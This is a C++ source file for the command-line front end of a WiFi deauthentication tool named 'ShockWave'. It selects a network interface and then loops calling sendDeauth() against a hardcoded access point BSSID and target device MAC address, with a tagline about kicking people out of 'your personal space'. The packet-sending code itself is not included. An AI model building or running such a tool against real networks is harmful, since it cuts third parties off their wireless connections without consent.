#include "CLI.h"

using namespace std;

CLI::CLI()
{
    state = CHOOSEIF;
}

CLI::~CLI()
{
    //dtor
}

void CLI::mainLoop() {
    while(true) {
        showMenu();
        usleep(100000);
    }
}

void CLI::showHeader() {
    cout << "--------------ShockWave----------------" << endl;
    cout << "-----------By Transpalette-------------" << endl;
    cout << "--Kick em out of your personal space---" << endl;
    cout << "***************************************" << endl;
    cout << "****                               ****" << endl;
}

void CLI::listInterfaces() {
    interfaces = network.getInterfaces();

    int i = 0;
    for (const wstring& iface : interfaces) {
        wcout << ++i << ". " << iface << endl;
    }
}

void CLI::chooseInterface(int no) {
    wstring w_iface = interfaces.at(no - 1);

    //setup converter
    using convert_type = codecvt_utf8<wchar_t>;
    wstring_convert<convert_type, wchar_t> converter;

    //use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    string iface = converter.to_bytes(w_iface);
    cout<<iface<<endl;
    network.setInterface(iface);
}

void CLI::showAction() {
    switch(state) {
        case CHOOSEIF:
            listInterfaces();
            int interfaceNo;
            cout << "Interface: ";
            cin >> interfaceNo;
            chooseInterface(interfaceNo);
            state = ATTACK;
        break;
        case WHITELIST:
        break;
        case ATTACK:
            attack();
        break;
    }
}

void CLI::showMenu() {
    system("clear");
    showHeader();
    showAction();
}

void CLI::attack() {

    cout << "**** -> BSSID: AE:28:06:AD:19:70   ****" << endl;
    cout << "**** -> Target: 40:b4:cd:6e:de:d5  ****" << endl;
    cout << "**** Deauthenticating...           ****" << endl;

    while (true) {
        network.sendDeauth();
        usleep(1000000);
    }
}
